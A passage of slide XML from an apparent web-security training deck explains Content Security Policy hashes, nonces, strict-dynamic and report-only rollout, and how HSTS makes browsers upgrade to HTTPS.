          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Any change (even whitespace) to the script invalidates the hash.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Attackers can’t change the inline script without also changing the hash in your header</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Pros</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Great for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>static content</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Static sites, templates that rarely change.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="628650" lvl="1" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Build step can compute hashes automatically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>No runtime nonce plumbing needed; easier on CDNs in some cases.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Cons</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Change the script → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>must</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> recompute and redeploy the hash.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Header can get large if you have many inline snippets.</a:t>
            </a:r>
          </a:p>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9CB825B8-7426-F73E-517B-E9A977D22E0A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>171</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="233082869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D0137-C48F-9065-5DE1-C70212B62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B3CAC-D3EA-09C5-8654-A2529932C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6979EA-596D-C189-34BE-0FDA96E6316E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Recommend using JS 'Helmet' package</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Pros</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Easy to work with dynamic apps (script contents can change; nonce stays “just random”).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Smaller header footprint than hashes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Cons</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Requires server cooperation (template engine or middleware must inject nonces).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Must be generated fresh per response and not cached incorrectly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CDA19F74-A076-4924-1254-E3AF23BD3D21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>172</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="154207848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0CCA9-B2CF-AAA4-6DBA-5C598DBDC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F6BAC-D312-60C6-5E38-3D077EEE9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26B34-816D-2C15-4B14-A9D9A398077F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The problem: domain allowlists don’t scale, making allow list management difficult. Adding a tag manager that pulls scripts from a dozen domains creates </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>monster allowlists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> that:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Are hard to maintain,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Often too permissive,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Strict-dynamic allows scaling of your domain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B15FD027-34C0-5426-5C63-64B72D955ED6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>173</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="147592227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6DD1F-4F05-66AA-0D44-2AD4CDE27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2756A-BB17-068A-BDEA-5C52E79DE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BD5E7-0BCA-4463-576F-74A22C98B07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CD8FF39A-9D31-9539-3A90-E00EBDAC1E45}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>174</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="125031473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CFB7-BF24-7B7A-459B-B2D9192DD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45F65-4DB2-B54D-FE48-35A5DABFF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26C67-B6FB-17D0-D116-74E4D2D23B4B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>You can run both policies at once.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>enforcing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> policy (maybe a bit looser),</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>report-only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> policy (stricter, experimental).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is explicitly recommended in OWASP’s CSP cheat sheet.</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30114AEE-A44A-4997-6249-40499450A11D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>175</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1091160840"/>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9C4AB-2502-AB59-8C95-857721D13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F4F1A-D48F-AD72-AEF0-E38A0161A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2FED4-65EA-F9C4-22CB-49FC7429E686}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Start with a relaxed policy in Report-Only mode</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Analyze reports</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Tighten/adjust the policy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Switch from Report-Only to enforced CSP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>You can also run both policies at once.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>enforcing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> policy (maybe a bit looser),</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>report-only</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> policy (stricter, experimental).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is explicitly recommended in OWASP’s CSP cheat sheet.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14824C87-65E2-0A29-B12D-37291C52D18B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>176</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="399271498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EEBA6-3462-32C7-9AC6-68F425C46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4D07A-E54C-9C6E-3C57-8C3456C50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B6ACA-3C2A-F06F-75CB-9B9AE2E3054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5A83C71-B0B8-945C-BA55-82955982AD34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>177</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="455740997"/>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C6AAA-4878-8D9A-60D6-5EE075991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5A3BD-2AB0-312E-FE58-D99F045609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783FB-CD75-1978-3AA9-4918D96A6A62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Once a browser sees this directive, it will:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Refuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to send future requests to that domain over plain HTTP.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Auto-upgrade</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>http://example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> internally, before any request is made.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>From now on, until max-age expires:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
              <a:ea typeface="Calibri" panose="020F0502020204030204"/>
              <a:cs typeface="Calibri" panose="020F0502020204030204"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Any attempt (link, redirect, user typing </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="444444"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>http://example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) → browser upgrades silently to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="444444"/>
                </a:solidFill>
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>https://example.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> before sending the request.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial,Sans-Serif"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If TLS fails (invalid cert, hostname mismatch, etc.), the browser must </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>abort</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and not offer any kind of “Proceed anyway” override.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="444444"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="171450" indent="-171450">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9668397A-8ECC-3205-A1BB-EF796248C6C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="5"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{C17124A0-DBFB-4DE4-A1A5-B4AC97C10F51}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:t>178</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
